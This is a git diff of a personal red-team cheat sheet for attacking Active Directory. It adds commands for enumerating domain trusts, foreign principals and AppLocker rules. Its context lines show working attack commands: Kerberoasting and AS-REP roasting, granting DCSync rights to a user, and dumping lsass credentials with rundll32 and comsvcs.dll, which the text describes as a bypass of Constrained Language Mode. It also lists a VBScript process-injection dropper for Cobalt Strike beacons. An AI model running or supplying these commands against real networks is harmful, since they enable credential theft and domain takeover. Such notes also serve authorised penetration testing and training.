@@ -6,12 +6,13 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 
 * **[ACLs/ACEs permissions](#acls-possible-abuse)**
 * **Enumeration**
-	* **[Domain Enumeration](#powerview-enumeration)
+	* **[Domain Enumeration](#powerview-enumeration)**
 		* [ASREP Roasting](#asrep-roasting)
 		* [Kerberoasting](#kerberoasting)
 	* **[Constrained Language Mode](#constrained-language-mode)**
 		* [CLM Enumeration](#clm-enumeration)
 		* [Dump lsass with rundll32(signed binary](#dump-lsass-process-with-signed-binary)
+	* **[Foreign Principals](#foreign-principals)**
 * **Delegation**
 	* [Unconstrained Delegation](#unconstrained-delegation)
 		* [Printer Bug](#printer-bug)
@@ -24,6 +25,7 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* [Targeted Kerberoast](#targeted-kerberoast)
 	* [Add DCsync privilege to object](#add-dcsync-to-object)
 	* [Add Users to Group](#add-users-to-group)
+* **[SQL Server Enumeration and Code Execution (PowerUpSQL)](#sql-server-enumeration-and-code-execution)
 * **[Generate VBScript dropper (APC process injection)](#generate-vbscript-dropper-apc-process-injection)**
 	* [Cobalt Strike Beacon](#cobalt-strike-beacon)
 	* [Covenant Grunt](#convenant-grunt)
@@ -38,6 +40,14 @@ ACL/ACE | Permission | Abuse
 **Self-Membership** | ability to add ourself to a group | [Add owned users to other group](#add-users-to-group)
 
 ## Domain Enumeration
+### Forest Trust
+```
+# Map all domain trusts
+Get-DomainTrustMapping -Verbose
+
+# Get Forest Trust from current domain
+Get-DomainTrust
+```
 ### ASREP Roasting
 ```
 Get-DomainUser -PreauthNotRequired
@@ -50,13 +60,27 @@ Get-DomainUser -SPN
 # Rubeus
 Rubeus.exe kerberoast /nowrap
 ```
+### Foreign Principals
+Foreign principal means other user(s) from trusted domain that have access to current domain
+```
+# Get foreign user principals
+Find-ForeignUser
 
-## Constrained Language Mode (CLM)
+# Get foreign group principals
+Find-ForeignGroup
+```
+
+## Constrained Language Mode (CLM) / WDAC / Device Guard
 ### CLM Enumeration
 ```
 $ExecutionContext.SessionState.LanguageMode
 ```
+### View AppLocker Rules
+```
+Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections
+```
 ### Dump lsass process with signed binary
+This method will bypass CLM to dump lsass since we are using MS signed binary (whitelisted)
 ```
 # Run this in victim/remote computer
 rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\Windows\Tasks\lsass.dmp full
@@ -138,6 +162,9 @@ Set-DomainObject -Identity sqlsvc -Clear serviceprincipalname
 ```
 Add-DomainObjectAcl -TargetIdentity "DC=contoso,DC=local" -PrincipalIdentity studentuser -Rights DCSync
 ```
+
+## SQL Server Enumeration and Code Execution
+//add here
 
 ## Generate VBScript dropper (APC process injection)
 Make sure to download [GadgetToJScript](https://github.com/med0x2e/GadgetToJScript.git) and [Donut](https://github.com/TheWover/donut.git)._Note:This method probably won't 100% bypass EDR/AV._
